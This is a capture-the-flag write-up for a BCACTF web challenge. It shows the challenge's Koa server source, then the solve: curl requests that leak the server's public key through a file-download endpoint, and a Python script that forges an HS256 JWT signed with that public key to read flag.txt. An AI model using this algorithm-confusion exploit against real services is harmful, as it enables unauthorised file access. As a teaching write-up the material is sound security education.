# L10on Poll | Web

### Solution

From ctf we have got url to website, package.json and server.ts

##### server.js

```js  
import Koa from 'koa';  
import koaStatic from 'koa-static';  
import Router from '@koa/router';  
import jwt from 'jsonwebtoken';  
import {readFileSync} from 'fs';  
import {fileURLToPath} from 'url';  
import {dirname, join} from 'path';  
import bodyParser from 'koa-bodyparser';  
import send from 'koa-send';

const __dirname = dirname(fileURLToPath(import.meta.url));

let yesVotes = 0;  
let noVotes = 0;

const privateKey = readFileSync(join(__dirname, "key.priv"), "utf8");  
const publicKey = readFileSync(join(__dirname, "key"), "utf8");  
const msgs = readFileSync(join(__dirname, "errormessages"),
"utf8").split("\n").filter(s => s.length > 0);  
/** @type {import("./languages.json")} */  
const languages = JSON.parse(readFileSync(join(__dirname, "languages.json"),
"utf8"));

const languageRegex = /^[a-z]+$/;

const app = new Koa();  
const router = new Router();

/**  
* @param {string} language  
* @returns {string}  
*/  
function generateToken(language) {  
   return jwt.sign({language}, privateKey, {algorithm: "RS256"});  
}

router.get("/localisation-file", async ctx => {  
   const token = ctx.cookies.get("lion-token");  
   /** @type {string} */  
   let language;  
   if (token) {  
       const payload = await new Promise((resolve, reject) => {  
           try {  
               jwt.verify(token, publicKey, (err, result) => err ? reject(err) : resolve(result));  
           } catch (e) {  
               reject(e);  
           }  
       });  
       language = payload.language;  
   } else {  
       language = languages[Math.floor(Math.random() * languages.length)].id;  
       ctx.cookies.set("lion-token", generateToken(language));  
   }  
   await send(ctx, language, {root: __dirname});  
});

router.post("/localization-language", async ctx => {  
   const language = ctx.request.body?.language;  
   if (typeof language === "string") {  
       if (language.match(languageRegex)) {  
           ctx.cookies.set("lion-token", generateToken(language));  
       } else {  
           ctx.throw(400, msgs[Math.floor(Math.random() * msgs.length)]);  
       }  
   } else {  
       ctx.throw(400, "no language");  
   }  
   ctx.redirect("/");  
});

router.get("/languages", async ctx => {  
   ctx.body = languages;  
});

router.post("/y", async ctx => {  
   yesVotes++;  
   ctx.body = [yesVotes, noVotes];  
});

router.post("/n", async ctx => {  
   noVotes++;  
   ctx.body = [yesVotes, noVotes];  
});

app.use(bodyParser());  
app.use(router.routes());  
app.use(router.allowedMethods());  
app.use(koaStatic(join(__dirname, "../public")));  
app.listen(1337);  
```

##### package.json

```json  
{  
 "dependencies": {  
   "@koa/router": "^10.0.0",  
   "jsonwebtoken": "^3.2.2",  
   "koa": "^2.13.1",  
   "koa-bodyparser": "^4.3.0",  
   "koa-send": "^5.0.1",  
   "koa-static": "^5.0.0"  
 },  
 "type": "module",  
 "scripts": {  
   "start": "node server.js"  
 }  
}  
```

To get the flag we need to read the content of a flag.txt from server. That
give us the hint that we need to search for some way to read any file from
server. Website have `select language` functionality.  
After quick look at source code of server.js we can see that information about
selected language is stored in cookie as a JWT. In this case to create
signature of JWT server use private key and to verify it layer - public key.  
  

Further, in the code we can see subpage `/localization-language` that
apparently allow us to select our language and return JWT signed with private
key.  
  
Next subpage that is worth attention is `/localisation-file`, because with use
of it we can download file with translations for all provided languages.

```bash  
$ curl "http://web.bcactf.com:49159/localization-language" -X POST -H
"Content-Type:application/json" --data-raw '{"language": "key"}' -c cookie.txt  
```

With command above I sent post request and in return I have got signed JWT
with selected language as "*key*". Request with created JWT to `/localisation-
file` allowed me to download file specified in *language* parameter.

```bash  
$ curl "http://web.bcactf.com:49159/localisation-file" --cookie "lion-
token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJsYW5ndWFnZSI6ImtleSIsImlhdCI6MTYyMzY4MjQwMX0.Dyrr6Z3wWz2pmU5UeY1Xool2LSu5AG8D7tg_N-g8jFtGypXTvLYzQ4fWvmdbkT2S6oL5ptGvlo-8SugaxmX07Gr2Av4aOHnJahIoaCG6zRSqkYIrANJLjPM-
qbX3cEvJZSG2ElC9sW6GKBzFTpIqziSZPUyt_NPn3dBKgW3jxrE"  
```

This request resulted with server public key:

```txt  
-----BEGIN PUBLIC KEY-----  
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCRaHtUpvSkcf2KCwXTiX48Tjxf  
bUVFn7YimqGPQbwTnE0WfR5SxLK/DH0os9jCCeb7pJ08AbHFBzQNUfbg47xI3aJh  
PMdjL/w3iqfc56C7lt59u4TeOYc7kguph/GTYDPDZkgtbkFJmbkbg9MvV723U1PW  
M7N2P4b2Xf3p7ZtaewIDAQAB  
-----END PUBLIC KEY-----  
```

We can't download any file with character other than lower case a-z, because
of regex in `/localisation-language`, but if we could skip this step and sign
JWT by our self this would not be a problem. So I start searching.  
On [jwt.io](https://jwt.io) website, below token editor, I found yellow,
warning rectangle with link to [this article](https://auth0.com/blog/critical-
vulnerabilities-in-json-web-token-libraries/) about vulnerabilities in JWT
token with asymmetric keys.  
  

In article I read about vulnerability in old version of JWT that mislaid
decoder that token was encoded not with rsa key, but with password.  
Because of that I could encode my own JWT with language parameter as a
`flag.txt` and  
encode it with public key. In this case server will try to verify my token by
decoding it with provided to function password - public key.  
  

With that knowledge I wrote small python script to generate JWT:

```py  
import jwt

with open("key.pub", "r") as f:  
   secret = f.read()

encoded_jwt = jwt.encode({"language": "flag.txt", "iat": "1623478547"},
secret, algorithm="HS256")  
print(encoded_jwt)  
```  
Generated JWT:  
```txt  
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsYW5ndWFnZSI6ImZsYWcudHh0IiwiaWF0IjoiMTYyMzQ3ODU0NyJ9.wk7fc3wR1gU4cIRs2ZXT0FYC0gLaN0EWkNpyfIWUlpg  
```

### Flag

bcactf{h3_c0mes_Ur74hshR}

#### Credits

- Writeup by [HuntClauss](https://ctftime.org/user/106464)  
- Solved by [HuntClauss](https://ctftime.org/user/106464)  
- WaletSec 2021

#### License

**CC BY 4.0** WaletSec + HuntClauss

Original writeup
(https://github.com/HuntClauss/Writeups/blob/main/bcactf/l10n-pool.md).